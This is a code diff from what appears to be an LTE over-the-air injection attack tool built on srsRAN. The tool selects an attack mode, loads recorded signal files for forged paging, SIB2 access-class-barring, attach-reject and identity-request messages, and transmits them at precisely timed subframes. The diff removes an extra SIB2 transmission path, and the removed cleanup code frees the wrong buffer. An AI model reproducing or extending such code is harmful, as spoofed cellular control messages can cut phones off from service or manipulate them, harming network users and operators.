@@ -93,13 +93,11 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  static cf_t* po_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ar_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ir_buffer[SRSRAN_MAX_PORTS] = {NULL};
- static cf_t* sib2else_buffer[SRSRAN_MAX_PORTS] = {NULL};
 
  static char* paging_file_name;
  //static char* mib_file_name;
  static char* sib1_file_name;
  static char* sib2_file_name;
- static char* sib2else_file_name;
 
  static char* attachreject_file_name;
  static char* identityrequest_file_name;
@@ -363,7 +361,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
                     paging_msg = true;
                     paging_file_name = "paging_sysinfmod_sf9.fc32";
                     sib2_file_name = "sib2_acbarring_sf1.fc32";
-                    sib2else_file_name = "sib2_acbarring_else.fc32";
                 }
                 else if (strcmp(attack_mode, "pdcch_order") == 0) {
                     po_msg = true;
@@ -486,13 +483,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        exit(-1);
      }
      srsran_vec_cf_zero(sib2_buffer[i], sf_n_samples);
-
-    sib2else_buffer[i] = srsran_vec_cf_malloc(else_sf_n_samples);
-     if (!sib2else_buffer[i]) {
-       perror("malloc");
-       exit(-1);
-     }
-     srsran_vec_cf_zero(sib2else_buffer[i], else_sf_n_samples);
 
      po_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
      if (!po_buffer[i]) {
@@ -692,9 +682,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
      if (sib2_buffer[i]) {
        free(sib2_buffer[i]);
      }
-     if (sib2else_buffer[i]) {
-       free(sib2_buffer[i]);
-     }
+
      if (po_buffer[i]) {
       free(po_buffer[i]);
     }
@@ -1183,19 +1171,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
         }
        } else if (sib2_msg && paging_msg) {
         if (next_sfn % sib2_period == 0) {
-        //if (next_sfn % sib2_period == 0 || true) {
-
-          /*target_tti = 0;
-          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
-          float last_time = (30720 - 3072 - else_sf_n_samples)/30720 * 0.001 ;
-          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 + last_time;
-          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
-          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
-          ret = srsran_rf_send_timed_multi(&radio, (void**) sib2else_buffer, else_sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
-          if (ret != else_sf_n_samples) {-
-            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
-            exit(-1);
-          }*/
           target_tti = 1;
           memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
           time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
@@ -1697,8 +1672,6 @@ int main(int argc, char** argv)
      if (sib2_msg) {
        printf ("Ready SIB2 Case!\n");
        read_file(sib2_buffer[0], sib2_file_name);
-
-       read_file(sib2else_buffer[0], sib2else_file_name);
      }
      if (po_msg) {
       printf ("Ready Pdcch Order Case!\n");
